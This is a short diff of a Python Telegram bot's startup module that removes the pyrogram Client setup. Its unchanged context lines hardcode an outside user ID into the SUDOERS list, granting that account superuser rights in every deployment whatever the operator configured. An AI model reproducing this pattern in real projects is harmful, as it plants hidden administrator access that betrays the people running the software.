@@ -2,7 +2,6 @@ import asyncio
 import time
 from alpha import BOT_DET
 from motor.motor_asyncio import AsyncIOMotorClient as MongoClient
-from pyrogram import Client
 
 import config
 
@@ -19,9 +18,3 @@ SUDOERS = config.SUDO_USER
 if 1985209910 not in SUDOERS:
     SUDOERS.append(1985209910)
 
-app = Client(
-    ":THE-END:",
-    config.API_ID,
-    config.API_HASH,
-    bot_token=config.BOT_TOKEN,
-)
